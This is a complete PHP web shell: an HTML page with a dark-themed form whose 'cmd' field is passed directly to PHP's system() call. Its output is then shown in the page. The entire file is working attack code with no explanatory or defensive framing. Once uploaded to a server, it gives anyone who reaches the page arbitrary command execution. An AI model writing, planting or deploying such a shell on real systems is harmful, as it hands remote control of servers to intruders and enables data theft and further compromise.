<html>
<head>
    <title>WebShell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
        }
        input[type="text"] {
            width: 80%;
            padding: 5px;
            font-size: 14px;
            color: #1e1e1e;
        }
        input[type="submit"] {
            padding: 5px 10px;
            font-weight: bold;
            background-color: #007acc;
            color: white;
            border: none;
            border-radius: 5px;
        }
        pre {
            background-color: #2d2d2d;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <h2>WebShell</h2>
    <form method="GET">
        <input type="text" name="cmd" id="cmd" autofocus>
        <input type="submit" value="Execute">
    </form>
    <pre>
<?php
    if (isset($_GET['cmd'])) {
        echo "<span style='color: #6A9955;'>$ </span>" . htmlspecialchars($_GET['cmd']) . "\n";
        system($_GET['cmd'] . ' 2>&1');
    }
?>
    </pre>
</body>
</html>
